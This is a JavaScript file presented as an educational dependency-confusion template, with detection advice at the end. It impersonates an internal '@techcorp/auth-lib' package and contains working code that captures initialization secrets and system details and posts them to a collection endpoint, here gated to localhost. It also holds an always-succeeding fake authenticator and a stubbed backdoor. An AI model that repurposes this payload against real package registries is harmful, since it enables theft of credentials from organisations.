/**
 * EDUCATIONAL EXAMPLE: Dependency Confusion Attack Template
 * 
 * This template demonstrates a malicious package for dependency confusion
 * Package: @techcorp/auth-lib (malicious public version)
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as educational
 * 
 * ATTACK STRATEGY:
 * 1. Publish with version 999.999.999 (higher than internal version)
 * 2. Provide working functionality (avoid suspicion)
 * 3. Exfiltrate sensitive initialization data
 * 4. Remain persistent through updates
 */

const http = require('http');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Exfiltrate configuration data passed to the package
 * This is the key attack: capturing sensitive initialization data
 */
function exfiltrateConfig(packageName, config) {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    console.log('[SAFE MODE] Malicious behavior prevented - not in testbench');
    return;
  }

  console.log(`[TESTBENCH] Dependency Confusion: Capturing data from ${packageName}...`);

  // In a real attack, this would capture:
  // - API keys and secrets
  // - Database connection strings
  // - Internal service URLs
  // - Authentication tokens
  // - Any other configuration data
  
  const dataToExfiltrate = {
    attack: 'dependency-confusion',
    timestamp: new Date().toISOString(),
    package: {
      name: packageName,
      version: '999.999.999',  // Suspicious high version
      description: 'Malicious package mimicking internal package'
    },
    capturedConfig: config,  // The sensitive data!
    system: {
      platform: process.platform,
      nodeVersion: process.version,
      cwd: process.cwd(),
      environment: process.env.NODE_ENV
    },
    // In real attacks, might also capture:
    // - Environment variables (process.env)
    // - File system information
    // - Network configuration
    // - Installed packages
  };

  // SAFETY: Only send to localhost mock server
  const payload = JSON.stringify(dataToExfiltrate);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
      'X-Attack-Type': 'dependency-confusion'
    }
  };

  const req = http.request(options, (res) => {
    console.log(`[TESTBENCH] Exfiltration simulated (Status: ${res.statusCode})`);
  });

  req.on('error', (e) => {
    // Silently fail to avoid detection (typical malware behavior)
    // In testbench, we log for educational purposes
    console.log('[TESTBENCH] Mock server not available:', e.message);
  });

  req.write(payload);
  req.end();
}

// ============================================================================
// LEGITIMATE CODE SECTION - Mimics Internal Package
// ============================================================================
// The package MUST provide working functionality to avoid immediate detection

class AuthLib {
  static init(config) {
    // EXECUTE MALICIOUS PAYLOAD
    // This happens when the package is initialized
    exfiltrateConfig('@techcorp/auth-lib', config);
    
    // But then provide working functionality!
    console.log('  [auth-lib] Initializing with PUBLIC registry version 999.999.999');
    console.log('  ⚠️  WARNING: This is the MALICIOUS version!');
    
    // Return working implementation (critical to avoid suspicion)
    return {
      apiKey: config.apiKey,
      secretKey: config.secretKey,
      authenticate: (user, password) => {
        // Provide real authentication (or at least something that works)
        return { success: true, token: 'public-token-malicious' };
      },
      validateToken: (token) => {
        // Provide real validation
        return { valid: true, user: 'compromised-user' };
      },
      // Could also add backdoor functionality:
      _backdoor: (command) => {
        if (process.env.TESTBENCH_MODE === 'enabled') {
          console.log('[TESTBENCH] Backdoor command:', command);
          // In real attack: execute arbitrary commands
        }
      }
    };
  }
}

module.exports = AuthLib;

// ============================================================================
// WHY THIS ATTACK IS SO EFFECTIVE:
// ============================================================================
//
// 1. HIGHER VERSION NUMBER:
//    - Internal version: 1.2.3
//    - Malicious version: 999.999.999
//    - npm/yarn will prefer the higher version
//
// 2. CORRECT PACKAGE NAME:
//    - Exactly matches internal package name
//    - No typo required
//    - Exploits configuration, not human error
//
// 3. WORKING FUNCTIONALITY:
//    - Provides same API as internal package
//    - Application continues to work normally
//    - No immediate signs of compromise
//
// 4. STEALS SENSITIVE DATA:
//    - Captures initialization config (API keys, secrets, etc.)
//    - Exfiltrates to attacker server
//    - Can include backdoors for persistence
//
// 5. HARD TO DETECT:
//    - Package lock files help but don't prevent initial compromise
//    - If package-lock.json is missing or regenerated, attack succeeds
//    - Automated tools may not catch it without specific checks
//
// 6. WIDE IMPACT:
//    - Affects entire organization
//    - Compromises CI/CD pipelines
//    - Can spread to production systems
//    - May affect customers if package is redistributed
//
// ============================================================================
// DETECTION METHODS:
// ============================================================================
//
// 1. Registry Source Verification:
//    - Check where package came from
//    - Internal packages should ONLY come from internal registry
//
// 2. Version Anomaly Detection:
//    - Suspiciously high versions (999.x, 9999.x)
//    - Sudden version jumps
//
// 3. Package Lock Files:
//    - Verify "resolved" field points to correct registry
//    - Check integrity hashes
//
// 4. Build-Time Scanning:
//    - Automated checks in CI/CD
//    - Verify all @techcorp/* packages from internal registry
//
// 5. Network Monitoring:
//    - Unusual outbound connections during install/init
//    - Connections to non-corporate domains
//
// ============================================================================

